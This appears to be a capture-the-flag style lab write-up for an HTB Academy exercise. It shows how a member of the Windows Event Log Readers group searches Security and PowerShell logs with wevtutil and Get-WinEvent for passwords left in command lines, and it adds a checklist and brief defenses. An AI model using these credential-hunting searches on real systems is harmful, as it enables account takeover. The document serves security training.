# 🛰️ Lab Environment

- **Credentials**: `logger:HTB_@cademy_stdnt!`
- **Access Method**: RDP
- **Objective**: Find password for user `mary` using Event Log Readers privileges

---

## 🔍 Detailed Step-by-Step Solution

### 1. RDP Connection
```bash
# Connect via RDP to target (IP will be provided)
xfreerdp /v:[TARGET_IP] /u:logger /p:'HTB_@cademy_stdnt!'
```

[!INFO] Replace `[TARGET_IP]` with the actual IP address of the lab environment.

### 2. Verify Group Membership
```cmd
# Open Command Prompt
net localgroup "Event Log Readers"
```
[!SUCCESS]
If `logger` is listed in the members, proceed to the next step.

### 3. Search Security Logs for Credentials

#### Method A: wevtutil Search
```cmd
# Search for /user patterns
wevtutil qe Security /rd:true /f:text | findstr "/user"

# Search for mary-specific entries
wevtutil qe Security /rd:true /f:text | findstr "mary"

# Search for password patterns
wevtutil qe Security /rd:true /f:text | findstr "password"
```

#### Method B: PowerShell Analysis
```powershell
# Open PowerShell
Get-WinEvent -LogName Security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*mary*' } | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}

Get-WinEvent -LogName Security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*password*' } | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

#### Method C: Comprehensive Search
```cmd
# Search multiple patterns systematically
wevtutil qe Security /rd:true /f:text | findstr "mary password"
wevtutil qe Security /rd:true /f:text | findstr "net use.*mary"
wevtutil qe Security /rd:true /f:text | findstr "runas.*mary"
```

[!SUCCESS] Look for command lines containing `mary` and related patterns.

### 4. Analyze Results
```cmd
# Look for command lines containing mary's credentials:
net use \\server\share /user:mary [PASSWORD]
runas /user:mary "cmd.exe" [PASSWORD]
psexec \\target -u mary -p [PASSWORD]
sqlcmd -S server -U mary -P [PASSWORD]
```

[!SUCCESS] Once a command line with `mary`'s credentials is found, extract the password.

### 5. Extract Password
```cmd
# Submit the discovered password for mary
```

---

## 🔄 Alternative Search Strategies

### Registry-Based Credential Search
```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI /s | findstr mary
```

[!WARNING] Ensure sufficient permissions before running this command.

### Application Event Logs
```cmd
wevtutil qe Application /rd:true /f:text | findstr "mary"
wevtutil qe System /rd:true /f:text | findstr "mary"
```
[!SUCCESS] Check for any relevant entries in application and system logs.

### PowerShell History Analysis
```powershell
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | where { $_.Message -like '*mary*' }
```

---

## 🔒 Common Credential Exposure Scenarios

### Network Authentication
```cmd
net use Z: \\fileserver\share /user:domain\mary P@ssw0rd123
net use \\server\ipc$ /user:mary SecretPassword
```
[!EXAMPLE] Example of `net use` commands exposing credentials.

### Service Execution
```cmd
psexec \\target -u mary -p MyPassword cmd.exe
runas /user:mary "application.exe"
```

### Database Connections
```cmd
sqlcmd -S sqlserver -U mary -P DatabasePass
mysql -h server -u mary -pMySQLPass
```
[!EXAMPLE] Example of database connection with embedded credentials.

### PowerShell Execution
```powershell
$cred = New-Object System.Management.Automation.PSCredential("mary", "Password123")
Invoke-Command -ComputerName server -Credential (Get-Credential mary)
```

---

## ⚠️ Limitations and Considerations

### Registry Permissions
[!WARNING] `Get-WinEvent` may require additional permissions to access certain registry keys.

### Log Retention
```cmd
# Event logs have size limits and rotation
wevtutil gl Security | findstr "LogMaxSize"
```
[!NOTE] Check log configuration for retention policies.

### Operational Awareness
Monitor for unusual activities related to event log access and modify detection rules accordingly.

---

## 🛡️ Defense Strategies

### Command Line Auditing Best Practices
- Use credential managers.
- Implement script-based authentication.
- Avoid embedding credentials in batch files.
- Use service accounts with stored credentials.

### Event Log Protection
```cmd
# Enable log forwarding to SIEM
wevtutil sl Security /ca:1
```
[!INFO] Set appropriate log retention policies and monitor group membership.

### Detection Rules
Monitor for:
- Unusual event log access patterns.
- Command lines containing credential indicators.
- Group modifications.

---

## 📋 Event Log Readers Exploitation Checklist

### Prerequisites
- [ ] **Event Log Readers membership** verified.
- [ ] **Process creation auditing enabled** on target.
- [ ] **Command line logging configured** (Event ID 4688).
- [ ] **Network/RDP access** to target system.

### Reconnaissance
- [ ] **Verify group membership** (`net localgroup "Event Log Readers"`).
- [ ] **Check log accessibility** (Security, Application, System).
- [ ] **Identify time ranges** for credential search.
- [ ] **Determine search patterns** based on target users.

### Credential Search
- [ ] **wevtutil searches** for credential patterns.
- [ ] **PowerShell analysis** of Event ID 4688.
- [ ] **Alternative log sources** (PowerShell Operational).
- [ ] **Pattern-based filtering** (/user, password, net use).

### Analysis and Extraction
- [ ] **Parse command lines** for embedded credentials.
- [ ] **Identify user accounts** and passwords.
- [ ] **Validate credential format** and complexity.
- [ ] **Document findings** for reporting.

---

## 💡 Key Takeaways

1. Event Log Readers provides access to sensitive command-line history.
2. Process creation auditing often exposes embedded credentials.
3. `wevtutil` and `Get-WinEvent` are primary analysis tools.
4. Command-line passwords are common in enterprise environments.
5. PowerShell logs may contain additional sensitive information.
6. Pattern-based searches effectively identify credential exposure.
7. Minimal privileges can yield high-value intelligence.

---